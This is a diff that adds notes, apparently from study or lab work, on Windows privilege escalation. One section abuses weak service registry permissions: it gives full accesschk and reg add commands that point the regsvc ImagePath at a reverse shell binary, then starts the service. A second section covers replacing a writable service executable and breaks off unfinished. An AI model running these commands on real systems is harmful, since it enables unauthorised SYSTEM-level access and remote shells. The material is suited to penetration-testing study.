@@ -313,6 +313,39 @@ It is an hierarchical database used to store information necessary to configure 
 - use `net start [service}` to start shell.
 
 
+### Weak Registry Permissions
+
+- Write registry access can allow an attacker overwrite the image path registry key of a service . In this case service `regsvc` is vulnerable, group `NT AUTHORITY/INTERACTIVE` can overwrite registry Imagepath.
+
+Command-:```accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\regsvc```
+
+![image](https://github.com/user-attachments/assets/6a9b85dd-c13d-4760-85e9-436cbbad8ba8)
+
+- Overwrite the image path
+
+Command-:```reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\PrivEsc\reverse.exe /f```
+
+- Then, use `net start regsvc` to start revshell
+
+![image](https://github.com/user-attachments/assets/efcddbb2-7a35-4bbf-a8f6-7d01cb1b9bfd)
+
+
+### Insecure Service Executables
+
+- An attacker can swap a services's binary executable with system privileges if it is writable by everyone.
+
+![image](https://github.com/user-attachments/assets/fc1972d0-a859-41b7-9c17-e60c52d5061e)
+
+- Copy and replace the binary with
+
+`copy [path] [path] /Y`
+
+- Start the service
+
+  
+
+
+
 
 
 
